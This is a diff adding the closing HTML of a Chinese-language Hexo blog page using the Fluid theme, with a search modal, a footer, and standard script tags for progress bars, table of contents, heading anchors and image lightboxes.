+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
